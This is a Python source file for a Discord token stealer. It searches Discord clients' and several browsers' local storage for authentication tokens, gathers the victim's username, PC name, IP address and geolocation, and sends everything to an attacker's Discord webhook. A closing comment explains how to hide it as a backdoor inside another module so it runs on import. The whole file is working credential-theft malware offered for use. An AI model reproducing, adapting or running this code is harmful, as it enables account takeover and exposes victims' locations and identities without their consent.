import os, re, json, urllib.request

WEBHOOK_URL = 'Webhook here'
# Type your discord webhook url over here

Ping_me = True # If true, will ping new when grabbes token
Blacklist = ["BlacklistedPeople2", "BlacklistedPeople2"] # If username equals to Blacklist, it will print "blacklisted" and will exit. 
# Only "PC NAME"

# Checking if pcname in blacklist
if os.getenv('USER', os.getenv('USERNAME', 'user')) in Blacklist:
    print("Blacklisted")
    exit()

# Finding tokens method
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

# Main
def JustaGrabber():
    
    # Token's paths
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        '<Discord> ': roaming + '\\Discord',
        '<LightCord> ': roaming + '\\Lightcord',
        '<Discord_Canary>' : roaming + '\\discordcanary',
        '<Discord_PTB>' : roaming + '\\discordptb',
        '<Google_Chrome>' : local + '\\Google\\Chrome\\User Data\\Default',
        '<Opera>' : roaming + '\\Opera Software\\Opera Stable',
        '<Brave>' : local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        '<Yandex>' : local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        '<Naver_whale>' : local + '\\Naver\\Naver Whale\\User Data\\Default',
        '<Naver_whale_Flash>' : local + '\\Naver\\Naver Whale Flash\\User Data\\Default'
    }


    # Ping 
    message = '||@everyone\n||' if Ping_me else ''

    # getting ip info
    def getipinfo():
        url = "http://ipinfo.io/json"
        responce = urllib.request.urlopen(url)
        data = json.load(responce)
        ip = data['ip']
        city = data['city']
        region = data['region']
        country = data['country']
        loc = data['loc']
        org = data['org']
        postal = data['postal']
        timezone = data['timezone']
        return ip,city,region,country,loc,org,postal,timezone

    # Sending infos
    message += '   \n'
    message += '> Username : ' + os.getenv('USER', os.getenv('USERNAME', 'user')) + ' / IP Adress : ' + getipinfo()[0] + ' / PC Name : ' +  os.getenv("COMPUTERNAME") +  '\n'
    message += '> Country : ' + getipinfo()[3] + ' / City : ' + getipinfo()[1] + ' / Region : ' +  getipinfo()[2] +  '\n'
    message += '> Postal : ' + getipinfo()[6] + ' / Timezone : ' + getipinfo()[7] + ' / Location : ' +  getipinfo()[4] +  '\n'
    message += '> Location : ' + "https://www.google.com/maps/search/google+map++" + getipinfo()[4] + '\n'
    message += "```md\n"

    # Find tokens
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n{platform}\n\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += '<Tokens_found : ' + f'{token}' + '>' + '\n'
        else:
            message += '[Error](No tokens found.)\n'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    message += "```"

    # Sending message
    payload = json.dumps({'content': message})

    try:
        req = urllib.request.Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urllib.request.urlopen(req)
    except:
        pass

# Only runs if starts this flie. If imported, will be not running.
# If you wanna use this as backdoor in your module, just delete line 109,111,112 then delete 4 spaces in front of line 110
if __name__ == '__main__':
    JustaGrabber()
else:
    print("Error 404")

